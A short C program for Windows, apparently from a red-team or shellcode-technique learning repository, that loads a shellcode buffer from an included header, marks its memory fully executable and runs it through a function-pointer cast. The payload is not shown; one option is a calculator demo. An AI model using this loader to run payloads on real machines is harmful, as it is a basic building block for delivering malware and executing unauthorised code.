#include <assert.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "../../commons/includes/os_tweaks.h"

#define CHOOSE_SHELLCODE 1
#if CHOOSE_SHELLCODE
#include "../../../shellcodes/generate_shellcode.h"
#else
#include "../../../shellcodes/boku_calc.h"
#endif

static_assert(sizeof(unsigned char) == 1, "Expecting 8 bits unsigned char");

#define FAIL 0

int main() {
  //  As far as I know in older windows version like win7 you can
  //  execute directly the shellcode without the needs of change memory
  //  permissions It requires that oldProtect points to valid memory so nullptr
  //  or 0 doesn't work.

  set_full_memory_permission((LPVOID)shellcode, sizeof(shellcode));

  //  one line, cast and execution
  ((void (*)())shellcode)();

  return EXIT_SUCCESS;
}
